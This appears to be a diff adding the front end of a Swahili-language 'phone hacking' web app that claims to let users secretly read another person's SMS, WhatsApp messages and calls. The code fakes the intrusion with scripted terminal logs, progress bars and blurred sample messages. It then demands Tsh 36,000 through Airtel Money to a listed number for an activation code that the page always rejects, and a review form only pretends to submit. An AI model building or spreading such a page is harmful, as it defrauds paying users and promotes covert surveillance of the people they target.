+                        <div class="text-white text-[12.5px] mt-2 font-bold tracking-wide">Whatsapp</div>
+                        <div class="absolute -top-1.5 -right-1.5 bg-red-500 text-white rounded-full min-w-[21px] h-[21px] flex justify-center items-center text-[11px] font-extrabold p-1 shadow-lg animate-bounce" id="whatsappBadge">0</div>
+                    </div>
+
+                    <div class="text-center relative cursor-pointer group" onclick="showDialog('message')">
+                        <div class="w-14 h-14 bg-cyan-500/20 border border-cyan-400/30 rounded-2xl flex items-center justify-center shadow-inner group-hover:scale-105 transition-transform">
+                            <svg class="w-7 h-7 fill-cyan-300 drop-shadow" viewBox="0 0 24 24">
+                                <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/>
+                            </svg>
+                        </div>
+                        <div class="text-white text-[12.5px] mt-2 font-bold tracking-wide">Message</div>
+                        <div class="absolute -top-1.5 -right-1.5 bg-red-500 text-white rounded-full min-w-[21px] h-[21px] flex justify-center items-center text-[11px] font-extrabold p-1 shadow-lg animate-bounce" id="messageBadge">0</div>
+                    </div>
+
+                    <div class="text-center relative cursor-pointer group" onclick="showDialog('calls')">
+                        <div class="w-14 h-14 bg-green-500/20 border border-green-400/30 rounded-2xl flex items-center justify-center shadow-inner group-hover:scale-105 transition-transform">
+                            <svg class="w-7 h-7 fill-green-400 drop-shadow" viewBox="0 0 24 24">
+                                <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
+                            </svg>
+                        </div>
+                        <div class="text-white text-[12.5px] mt-2 font-bold tracking-wide">Calls</div>
+                        <div class="absolute -top-1.5 -right-1.5 bg-red-500 text-white rounded-full min-w-[21px] h-[21px] flex justify-center items-center text-[11px] font-extrabold p-1 shadow-lg animate-bounce" id="callsBadge">0</div>
+                    </div>
+                </div>
+
+                <div class="bg-[#0a3594]/60 backdrop-blur-md border border-blue-400/40 text-[18px] p-5 rounded-[22px] mb-5 shadow-xl leading-[1.7] text-white">
+                    <strong>System yetu imefanikiwa kukamata mawasiliano yote ya meseji (SMS) zinazoingia na kutoka katika namba ulio hack.<br/><br/>
+
+Kuanzia sasa unaweza kuona meseji zote za zamani zilizopita na utakua unapata meseji zote mpya zitakazokuwa zinatumwa na kupokelewa katika namba ulio hack<br/><br/>
+
+Meseji zote atakazo tuma kwa watu au akitumiwa na watu katika simu yake  zitakuwa zinakuja kwenye simu yako kwa njia ya "notification" na utaweza kuzifungua na kuzisoma meseji zake zote ndani ya hii Application pasipo muhusika kujua kama meseji zake zinapitia kwako<br/><br/>
+
+Kwasasa unatakiwa kulipia Tsh. 36,000 (ELFU THELATHINI NA SITA) ili Tukupatie Activation code kwa ajili ya kuiwezesha Application hii<br/><br/>
+
+Lipia Tsh 36,000 sasahivi ili uweze kupata ACTIVATION CODE, Tuma Pesa Tsh 36,000 katika namba yetu ya AIRTEL MONEY namba hii <font color="orange">0664902792</font><br/><br/>
+
+<div style="background: rgba(255, 165, 0, 0.15); border: 2px dashed orange; padding: 15px; border-radius: 14px; margin: 15px 0; text-align: center;">
+<font color="orange" style="font-weight: 900; font-size: 17px; display: block; margin-bottom: 8px;">JINSI YA KULIPIA KUTOKA MITANDAO YOTE:</font>
+KAMA UNATUMIA M-PESA, MIXX By YAS (Tigopesa) au HALOPESA CHAGUA TUMA PESA KWENDA MITANDAO MINGINE KISHA CHAGUA AIRTEL MONEY NA WEKA NAMBA YETU HII YA AIRTEL MONEY <span style="color: #FFD700; font-weight: bold;">0664902792</span>
+</div><br/>
+
+Ukishatuma pesa Tsh 36,000 nakili (copy) meseji ya muamala itakayorudi kwako baada ya kutuma pesa au piga picha (screen shot) meseji hiyo ya muamala iliyorudi kwako na kisha tutumie meseji hiyo ya muamala wako katika WHATSAPP namba hii 0664902792 ili tuweze kufahamu kama niwewe umelipia Tsh 36,000. Tukutumie Activation Code yako.<br/><br/>
+
+Kwa sasa hautoweza kuona meseji za namba ulio hack mpaka ulipie Tsh 36,000 tukupatie activation code kwa ajili ya kuiwezesha hii Application.<br/><br/>
+
+Ukishapata Activation code, utatakiwa kuingiza hiyo Activation code tutakayo kupatia katika kibox kilichopo hapa chini kisha utabonyeza kitufe kilichoandikwa ACTIVATE hapa chini.<br/></strong>
+                </div>
+
+                <input type="number" class="w-full p-3.5 mb-4 border border-blue-400/40 bg-white text-black box-border rounded-[14px] font-bold text-[18px] shadow-inner outline-none focus:ring-2 focus:ring-cyan-400 transition-all" placeholder="Weka Activation code Hapa" id="numberInput">
+                <button class="w-full p-4 bg-gradient-to-r from-emerald-500 to-teal-500 text-white border-none rounded-[14px] text-[18px] font-extrabold cursor-pointer shadow-[0_6px_20px_rgba(16,185,129,0.4)] hover:scale-[1.01] active:scale-[0.98] transition-transform" id="continueBtn">ACTIVATE</button><br/><br/><br/><br/>
+
+                <a href="https://vovopax.wapka.site/terms" id="termsBtn" class="hidden block w-full p-4 bg-blue-600/70 backdrop-blur border border-blue-400/40 text-white text-center no-underline text-[18px] font-bold border-none rounded-[14px] cursor-pointer shadow-lg hover:bg-blue-600/90 transition-all">TERMS AND SERVICES</a><br/><br/>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- DIALOG YA KISASA -->
+    <div class="dialog-overlay hidden fixed top-0 left-0 w-full h-full bg-black/70 backdrop-blur-md justify-center items-center z-50" id="dialogOverlay" style="display: none;">
+        <div class="dialog-box bg-gradient-to-b from-[#0950d8] to-[#04288b] border border-blue-400/40 p-7 rounded-[26px] text-center text-white max-w-[85%] shadow-2xl">
+            <div class="dialog-message mb-6 text-[17px] font-semibold leading-relaxed tracking-wide text-blue-50" id="dialogMessage"></div>
+            <button class="dialog-close py-3 px-8 bg-gradient-to-r from-[#FFD700] to-[#FFC400] text-[#001f60] border-none rounded-[14px] font-extrabold text-[16px] cursor-pointer shadow-lg hover:scale-105 active:scale-95 transition-transform" id="closeDialog">Sawa</button>
+        </div>
+    </div>
+
+    <!-- DIALOG YA ANDIKA MAONI (YENYE MKOA NA NYOTA) -->
+    <div id="reviewModalOverlay" class="hidden fixed top-0 left-0 w-full h-full bg-black/70 backdrop-blur-md justify-center items-center z-50" style="display: none;">
+        <div class="bg-gradient-to-b from-[#0950d8] to-[#04288b] border border-blue-400/40 p-6 rounded-[24px] text-white w-[90%] max-w-[340px] shadow-2xl text-left">
+            <h3 class="text-[20px] font-extrabold mb-4 text-[#FFD100] text-center tracking-wide">Andika Maoni Yako</h3>
+            
+            <div class="mb-3">
+                <label class="block text-[13px] font-bold text-blue-100 mb-1">Jina Lako:</label>
+                <input type="text" id="reviewerName" placeholder="Weka jina lako" class="w-full p-3 bg-white text-gray-900 border border-blue-300 rounded-xl text-[14px] outline-none font-semibold shadow-inner">
+            </div>
+
+            <div class="mb-3">
+                <label class="block text-[13px] font-bold text-blue-100 mb-1">Mkoa Ulio:</label>
+                <input type="text" id="reviewerRegion" placeholder="Mf. Dar es Salaam" class="w-full p-3 bg-white text-gray-900 border border-blue-300 rounded-xl text-[14px] outline-none font-semibold shadow-inner">
+            </div>
+
+            <div class="mb-3">
+                <label class="block text-[13px] font-bold text-blue-100 mb-1">Weka Nyota (Rating):</label>
+                <div id="starContainer" class="flex gap-2 text-2xl cursor-pointer">
+                    <span data-value="1" onclick="setRating(1)" class="text-yellow-400">★</span>
+                    <span data-value="2" onclick="setRating(2)" class="text-yellow-400">★</span>
+                    <span data-value="3" onclick="setRating(3)" class="text-yellow-400">★</span>
+                    <span data-value="4" onclick="setRating(4)" class="text-yellow-400">★</span>
+                    <span data-value="5" onclick="setRating(5)" class="text-yellow-400">★</span>
+                </div>
+            </div>
+
+            <div class="mb-4">
+                <label class="block text-[13px] font-bold text-blue-100 mb-1">Maoni Yako:</label>
+                <textarea id="reviewerComment" placeholder="Andika maoni yako hapa..." rows="3" class="w-full p-3 bg-white text-gray-900 border border-blue-300 rounded-xl text-[14px] outline-none font-semibold shadow-inner resize-none"></textarea>
+            </div>
+            
+            <div class="flex gap-3">
+                <button onclick="closeReviewModal()" class="flex-1 py-3 bg-white/20 hover:bg-white/30 text-white font-bold rounded-xl active:scale-95 transition-all text-center text-[14px]">Ghairi</button>
+                <button onclick="submitReview()" class="flex-1 py-3 bg-gradient-to-r from-[#FFD700] to-[#FFC400] text-[#001f60] font-extrabold rounded-xl shadow-lg active:scale-95 transition-all text-center text-[14px]">CHAPISHA</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let wakeLock = null;
+        let selectedRating = 5;
+
+        async function requestScreenWakeLock() {
+            if ('wakeLock' in navigator) {
+                try {
+                    if (wakeLock !== null) return;
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    wakeLock.addEventListener('release', () => { wakeLock = null; });
+                } catch (err) {}
+            }
+        }
+
+        ['touchstart', 'click', 'scroll', 'keydown', 'mousemove'].forEach(event => {
+            document.addEventListener(event, requestScreenWakeLock, { passive: true });
+        });
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') requestScreenWakeLock();
+        });
+
+        const APP_TEXTS = {
+            loadingText: "Tafadhali Subiri...",
+            ui1Title: "Weka namba ya simu ya mtu unaetaka kusoma meseji zake bila yeye kujua kisha bonyeza \"FUATILIA\" hapa chini",
+            btnEndelea: "FUATILIA"
+        };
+
+        window.addEventListener('DOMContentLoaded', () => {
+            requestScreenWakeLock();
+            document.getElementById('txtLoading').innerText = APP_TEXTS.loadingText;
+            document.getElementById('ui1Title').innerHTML = APP_TEXTS.ui1Title;
+            document.getElementById('btnEndeleaText').innerText = APP_TEXTS.btnEndelea;
+        });
+
+        function setRating(rating) {
+            selectedRating = rating;
+            const stars = document.querySelectorAll('#starContainer span');
+            stars.forEach((star, index) => {
+                if (index < rating) {
+                    star.classList.remove('text-gray-400');
+                    star.classList.add('text-yellow-400');
+                } else {
+                    star.classList.remove('text-yellow-400');
+                    star.classList.add('text-gray-400');
+                }
+            });
+        }
+
+        function handleAndikaMaoni() {
+            document.getElementById('reviewerName').value = '';
+            document.getElementById('reviewerRegion').value = '';
+            document.getElementById('reviewerComment').value = '';
+            setRating(5);
+            document.getElementById('reviewModalOverlay').style.display = 'flex';
+        }
+
+        function closeReviewModal() {
+            document.getElementById('reviewModalOverlay').style.display = 'none';
+        }
+
+        function submitReview() {
+            const name = document.getElementById('reviewerName').value.trim();
+            const region = document.getElementById('reviewerRegion').value.trim();
+            const comment = document.getElementById('reviewerComment').value.trim();
+
+            if(!name || !region || !comment) {
+                showDialog('review_empty');
+                return;
+            }
+
+            closeReviewModal();
+
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            document.getElementById('txtLoading').innerText = "Inachapisha maoni yako...";
+            loadingOverlay.classList.remove('hidden');
+            loadingOverlay.classList.add('flex');
+
+            setTimeout(() => {
+                loadingOverlay.classList.add('hidden');
+                loadingOverlay.classList.remove('flex');
+                showDialog('review_success');
+            }, 1800);
+        }
+
+        document.body.addEventListener('touchmove', function(e) {
+            if (!e.target.closest('.hide-scrollbar') && !e.target.closest('input') && !e.target.closest('textarea')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        function handleEndelea() {
+            const phoneInput = document.getElementById('phoneNumber').value.trim();
+            if(phoneInput === '') { showDialog('empty_phone'); return; }
+            if(phoneInput.length !== 9 && phoneInput.length !== 10) { showDialog('invalid_phone'); return; }
+
+            switchScreens('screen1', 'screen2', () => {
+                let namba = phoneInput;
+                if(namba.length === 9 && !namba.startsWith('0')) namba = '0' + namba;
+                document.getElementById('displayPhoneNumber').innerText = namba;
+            });
+        }
+
+        function handleThibitisha() {
+            const phoneInput = document.getElementById('phoneNumber').value;
+            switchScreens('screen2', 'screen3', () => {
+                let namba = phoneInput;
+                if(namba.length === 9 && !namba.startsWith('0')) namba = '0' + namba;
+                document.getElementById('screen3Phone1').innerText = namba;
+                document.getElementById('screen3Phone2').innerText = namba;
+                document.getElementById('screen3Phone3').innerText = namba;
+            });
+        }
+
+        function switchScreens(hideId, showId, callbackFn) {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            document.getElementById('txtLoading').innerText = APP_TEXTS.loadingText;
+            loadingOverlay.classList.remove('hidden');
+            loadingOverlay.classList.add('flex');
+            
+            setTimeout(() => {
+                loadingOverlay.classList.add('hidden');
+                loadingOverlay.classList.remove('flex');
+                document.getElementById(hideId).style.display = 'none';
+                const showEl = document.getElementById(showId);
+                showEl.classList.remove('hidden');
+                showEl.style.display = 'flex';
+                
+                if(showId === 'screen6') {
+                    triggerDynamicBadges();
+                    checkAndShowTermsButton();
+                }
+
+                if(callbackFn) callbackFn();
+            }, 2000);
+        }
+
+        function checkAndShowTermsButton() {
+            const termsBtn = document.getElementById('termsBtn');
+            let visitCount = localStorage.getItem('vekopax_visits');
+
+            if (!visitCount) {
+                localStorage.setItem('vekopax_visits', '1');
+                termsBtn.style.display = 'none';
+            } else {
+                termsBtn.style.display = 'block';
+            }
+        }
+
+        function typeText(elementId, text, speed, callback) {
+            let i = 0;
+            let el = document.getElementById(elementId);
+            if(!el) return;
+            el.innerText = "";
+            let interval = setInterval(() => {
+                el.innerText = text.substring(0, i + 1);
+                i++;
+                if (i >= text.length) {
+                    clearInterval(interval);
+                    el.classList.remove('cursor');
+                    if (callback) callback();
+                }
+            }, speed);
+        }
+
+        function makeBar(percent, length) {
+            let filledCount = Math.floor((percent / 100) * length);
+            let emptyCount = length - filledCount;
+            return '[' + '█'.repeat(filledCount) + '-'.repeat(emptyCount) + ']';
+        }
+
+        function handleSomaJumbe() {
+            switchScreens('screen3', 'screen4', startTerminalAnimation);
+        }
+
+        function startTerminalAnimation() {
+            typeText('txtWa', 'Searching WhatsApp...', 25, () => {
+                typeText('txtSms', 'Text Messaging...', 25, () => {
+                    typeText('txtCall', 'Phone Calls...', 25);
+                });
+            });
+
+            typeText('log1', '> Establishing secure tunnel...', 30, () => {
+                document.getElementById('log2').classList.remove('hidden');
+                typeText('log2', '> Please wait for synchronization...', 30);
+            });
+
+            const duration = 20000;
+            const startTime = Date.now();
+            let tOverlay = document.getElementById('terminalOverlay');
+            let tText = document.getElementById('terminalOverlayText');
+
+            function updateTerminal() {
+                let elapsed = Date.now() - startTime;
+                let progress = Math.min(elapsed / duration, 1);
+                let percent = Math.floor(progress * 100);
+
+                if (elapsed >= 5000 && elapsed < 8000) {
+                    tOverlay.style.display = 'flex';
+                    tText.innerText = "Subiri Tunatafuta Taarifa";
+                } else {
+                    tOverlay.style.display = 'none';
+                }
+
+                document.getElementById('barWa').innerText = makeBar(percent, 20) + ` ${percent}%`;
+                document.getElementById('barSms').innerText = makeBar(percent, 20) + ` ${percent}%`;
+                document.getElementById('barCall').innerText = makeBar(percent, 20) + ` ${percent}%`;
+
+                document.getElementById('percentCap').innerText = `${percent}%`;
+                document.getElementById('barCap').innerText = makeBar(percent, 40);
+
+                document.getElementById('percentNet').innerText = `${percent}%`;
+                document.getElementById('barNet').innerText = makeBar(percent, 40);
+
+                document.getElementById('percentFinal').innerText = `${percent}%`;
+                document.getElementById('barFinal').innerText = makeBar(percent, 40);
+
+                if (percent > 10) document.getElementById('f1').innerHTML = `<span class="text-[#00ff66]">[OK]</span>`;
+                if (percent > 25) document.getElementById('f2').innerHTML = `<span class="text-[#00ff66]">[OK]</span>`;
+                if (percent > 40) document.getElementById('f3').innerHTML = `<span class="text-[#00ff66]">[OK]</span>`;
+                if (percent > 60) document.getElementById('f4').innerHTML = `<span class="text-[#00ff66]">[OK]</span>`;
+                if (percent > 80) document.getElementById('f5').innerHTML = `<span class="text-[#00ff66]">[OK]</span>`;
+                if (percent > 95) document.getElementById('f6').innerHTML = `<span class="text-[#00ff66]">[OK]</span>`;
+
+                if (percent > 40) document.getElementById('capLog').innerText = `12:45:22 [INFO] Extracting information...`;
+                if (percent > 85) document.getElementById('capLog').innerHTML = `<span class="text-yellow-400">12:45:26 [SUCCESS] Data extracted successfully.</span>`;
+
+                if (percent > 15) document.getElementById('n1').innerHTML = `<span class="text-[#00ff66]">Connected</span>`;
+                if (percent > 30) document.getElementById('n2').innerHTML = `<span class="text-[#00ff66]">Connected</span>`;
+                if (percent > 45) document.getElementById('n3').innerHTML = `<span class="text-[#00ff66]">Connected</span>`;
+                if (percent > 60) document.getElementById('n4').innerHTML = `<span class="text-[#00ff66]">Monitoring...</span>`;
+                if (percent > 75) document.getElementById('n5').innerHTML = `<span class="text-[#00ff66]">Connected</span>`;
+                if (percent > 85) document.getElementById('n6').innerHTML = `<span class="text-[#00ff66]">Connected</span>`;
+                if (percent > 95) document.getElementById('n7').innerHTML = `<span class="text-[#00ff66]">Connected</span>`;
+
+                let processedFiles = Math.floor(progress * 15);
+                document.getElementById('statFiles').innerText = `: ${processedFiles} / 15`;
+                let processedSize = (progress * 68.2).toFixed(1);
+                document.getElementById('statSize').innerText = `: ${processedSize} MB`;
+
+                if (percent === 100) {
+                    document.getElementById('statStatus').innerHTML = `: <span class="text-[#00ff66]">SUCCESS</span>`;
+                    document.getElementById('bannerTitle').innerText = "NETWORK ANALYSIS COMPLETE";
+                    let bBox = document.getElementById('bannerBox');
+                    bBox.classList.replace('border-yellow-500/50', 'border-[#00ff66]/50');
+                    bBox.classList.replace('bg-yellow-900/20', 'bg-[#00ff66]/10');
+                }
+
+                let terminal = document.getElementById('screen4');
+                terminal.scrollTop = terminal.scrollHeight;
+
+                if (progress < 1) {
+                    requestAnimationFrame(updateTerminal);
+                } else {
+                    setTimeout(() => {
+                        switchScreens('screen4', 'screen5', startScreen5Messages);
+                    }, 500);
+                }
+            }
+
+            requestAnimationFrame(updateTerminal);
+        }
+
+        const allMessages = [
+            { phoneNumber: "+255 754 889 441", message: "Sasa itakuaje kuhusu ile ishu yetu ya jana?" },
+            { phoneNumber: "+255 765 432 198", message: "Utakuja saa ngapi nyumbani? Naomba kujua mapema" },
+            { phoneNumber: "+255 723 456 789", message: "Habari za mchana, naulizia ile pesa umefikia wapi?" },
+            { phoneNumber: "+255 655 765 432", message: "Tutaonana kesho mapema sana, usiongeze muda" },
+            { phoneNumber: "+255 712 345 678", message: "Asante sana kwa msaada wako mkubwa leo" },
+            { phoneNumber: "+255 787 654 321", message: "Usisahau kuja na ule mzigo wangu ukifika mjini" },
+            { phoneNumber: "+255 743 219 876", message: "Naomba umkumbushe yule kijana kuhusu zile nguo" },
+            { phoneNumber: "+255 753 543 210", message: "Usiku mwema, mungu akulinde na kukubariki" },
+            { phoneNumber: "+255 789 012 345", message: "Hongera sana kwa kazi nzuri uliyofanya leo" },
+            { phoneNumber: "+255 754 321 098", message: "Tuonane baadaye kama utakuwa na nafasi ya kupumzika" },
+            { phoneNumber: "+255 620 109 876", message: "Je, umemaliza ile kazi niliyokupa au bado?" },
+            { phoneNumber: "+255 765 432 109", message: "Ndiyo, nimejaribu kumtafuta lakini hapatikani kabisa" },
+            { phoneNumber: "+255 788 765 432", message: "Chakula kiko tayari, si unakuja kula au umechelewa?" },
+            { phoneNumber: "+255 743 210 987", message: "Nitachelewa kidogo kufika, tuonane baadaye kidogo" },
+            { phoneNumber: "+255 713 543 210", message: "Sawa, nitakungojea hapo hapo ulipo" },
+            { phoneNumber: "+255 714 882 110", message: "Mambo vipi, nimekuwekea yale mafuta kwenye gari" },
+            { phoneNumber: "+255 762 901 334", message: "Kesho nitapita ofisini kwako asubuhi kabisa" },
+            { phoneNumber: "+255 735 119 220", message: "Nitumie ile namba ya yule fundi haraka sana" }
+        ];
+
+        function getRandomMessages(count) {
+            const shuffled = [...allMessages].sort(() => 0.5 - Math.random());
+            return shuffled.slice(0, count);
+        }
+
+        function startScreen5Messages() {
+            let visibleMessages = 0;
+            const maxMessages = 7; 
+            const audio = document.getElementById('audio');
+            const messages = getRandomMessages(maxMessages); 
+            const messagesContainer = document.getElementById('messages');
+            const badge = document.getElementById('badge');
+            const progressBar = document.getElementById('progressBar');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+
+            messagesContainer.innerHTML = "";
+            loadingSpinner.style.display = 'block';
+
+            function playAudio() {
+                if(audio) {
+                    audio.currentTime = 0;
+                    audio.play().catch(e => console.error("Audio play failed:", e));
+                }
+            }
+
+            playAudio();
+
+            const showMessage = () => {
+                if (visibleMessages === 1) {
+                    loadingSpinner.style.display = 'none';
+                }
+
+                if (visibleMessages < messages.length) {
+                    const messageItem = document.createElement('div');
+                    messageItem.className = `flex items-center p-3 ${visibleMessages === messages.length - 1 ? 'animate-popup' : ''}`;
+
+                    messageItem.innerHTML = `
+                        <div class="w-11 h-11 bg-cyan-500/20 border border-cyan-400/30 rounded-full flex items-center justify-center mr-3 shrink-0 shadow-inner">
+                            <svg class="w-5 h-5 text-cyan-300 drop-shadow" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/>
+                            </svg>
+                        </div>
+                        <div class="flex-1 overflow-hidden">
+                            <p class="font-bold text-white text-[14.5px]">${messages[visibleMessages].phoneNumber}</p>
+                            <p class="text-[13px] text-blue-100/90 truncate">${messages[visibleMessages].message}</p>
+                        </div>
+                    `;
+
+                    messagesContainer.appendChild(messageItem);
+                    messagesContainer.scrollTop = messagesContainer.scrollHeight;
+                    playAudio();
+
+                    setTimeout(() => {
+                        const pElements = messageItem.querySelectorAll('p');
+                        if(pElements[0]) pElements[0].classList.add('blur-sm');
+                        if(pElements[1]) pElements[1].classList.add('blur-sm');
+                    }, 400);
+
+                    visibleMessages++;
+                    badge.textContent = visibleMessages;
+                    progressBar.style.width = `${(visibleMessages / maxMessages) * 100}%`;
+
+                    setTimeout(showMessage, 1500);
+                } else {
+                    switchScreens('screen5', 'screen6');
+                }
+            };
+
+            setTimeout(showMessage, 500);
+        }
+
+        function triggerDynamicBadges() {
+            const randomWhatsapp = Math.floor(Math.random() * 80) + 45;
+            const randomMessage = Math.floor(Math.random() * 40) + 15;
+            const randomCalls = Math.floor(Math.random() * 25) + 8;
+
+            animateNotification('whatsappBadge', randomWhatsapp, 2000);
+            animateNotification('messageBadge', randomMessage, 1800);
+            animateNotification('callsBadge', randomCalls, 1500);
+        }
+
+        document.getElementById('numberInput').addEventListener('keydown', function(e) {
+            if ([46, 8, 9, 27, 13].indexOf(e.keyCode) !== -1 ||
+                (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) ||
+                (e.keyCode >= 35 && e.keyCode <= 40)) {
+                    return;
+            }
+            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+                e.preventDefault();
+            }
+        });
+
+        document.getElementById('continueBtn').addEventListener('click', function() {
+            showDialog('continue');
+        });
+
+        document.getElementById('closeDialog').addEventListener('click', function() {
+            document.getElementById('dialogOverlay').style.display = 'none';
+        });
+
+        function animateNotification(elementId, finalCount, duration) {
+            const badge = document.getElementById(elementId);
+            if(!badge) return;
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                const currentCount = Math.floor(progress * finalCount);
+                badge.textContent = currentCount;
+                badge.style.display = 'flex';
+
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
+
+        function showDialog(type) {
+            const dialogMessage = document.getElementById('dialogMessage');
+            switch(type) {
+                case 'whatsapp':
+                    dialogMessage.textContent = "Huwezi kuziona meseji hizi za Whatsapp mpaka uweke Activation code. Kama hauna Activation Code tafadhali Lipia ili uweze kupata Activation code ndipo utaweza kuona na kusoma meseji hizi za Whatsapp. Fanya malipo kupata Activation code";
+                    break;
+                case 'message':
+                    dialogMessage.textContent = "Huwezi kuziona meseji mpaka uweke Activation code. Kama hauna Activation Code tafadhali Lipia ili uweze kupata Activation code ndipo utaweza kuona na kusoma meseji hizi. Fanya malipo kupata Activation code";
+                    break;
+                case 'calls':
+                    dialogMessage.textContent = "Huwezi kuona namba zilizopigwa na kusikiliza mazungumzo kwa sasa mpaka uweke Activation code. Kama hauna Activation Code tafadhali Lipia ili uweze kupata Activation code ndipo utaweza kuona nani kapiga na kusikiliza maongezi. Fanya malipo kupata Activation code";
+                    break;
+                case 'continue':
+                    dialogMessage.textContent = "Activation Code ulioweka bado haijaunganishwa kwenye system server, Tumeshindwa kuitambua. Tafadhali wasiliana na mtoa huduma kwa njia ya WhatsApp kupata msaada zaidi. Asante!!";
+                    break;
+                case 'empty_phone':
+                    dialogMessage.textContent = "Ni lazima uweke namba ya simu ili kuendelea.";
+                    break;
+                case 'invalid_phone':
+                    dialogMessage.textContent = "Namba uliyoweka si sahihi, namba hazijatimia au namba zimezidi. Tafadhali hakikisha namba na uweke namba sahihi.";
+                    break;
+                case 'review_empty':
+                    dialogMessage.textContent = "Tafadhali jaza jina lako, mkoa wako na maoni yako kwanza kabla ya kuchapisha.";
+                    break;
+                case 'review_success':
+                    dialogMessage.textContent = "Maoni yako yametumwa kikamilifu Asante";
+                    break;
+                default:
+                    dialogMessage.textContent = "How can we help you today?";
+            }
+            document.getElementById('dialogOverlay').style.display = 'flex';
+        }
+    </script>
+</body>
+</html>
